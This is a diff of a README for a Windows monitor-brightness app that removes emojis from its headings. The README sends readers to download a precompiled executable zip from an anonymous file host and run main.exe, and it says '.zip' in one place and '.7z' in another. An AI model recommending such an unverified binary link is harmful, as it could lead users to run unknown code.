@@ -17,16 +17,16 @@ Only DDC/CI-compatible monitor(s)
 
 You can either run the app from source using Python, or download a precompiled executable.
 
-## 📦 Download
+##  Download
 
 You can download the latest version of **Windows Brightness Manager** here:
 
-🔗 [Download for Windows (zip)](https://files.catbox.moe/19j2wg.zip)
+[Download for Windows (zip)](https://files.catbox.moe/19j2wg.zip)
 
 Make sure to extract the `.zip` file before running the app.
 
 
-## 🛠 How to Use
+##  How to Use
 
 1. Download and extract the `.7z` file.
 2. Double-click `main.exe` to launch the brightness manager.
